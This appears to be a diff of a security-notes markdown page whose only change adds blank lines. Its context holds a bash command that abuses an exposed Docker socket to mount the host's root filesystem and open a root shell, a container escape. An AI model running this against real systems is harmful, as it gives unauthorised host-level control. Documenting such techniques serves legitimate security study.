@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:34:34.755994+00:00'
 ```bash
 sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 ```
+
+
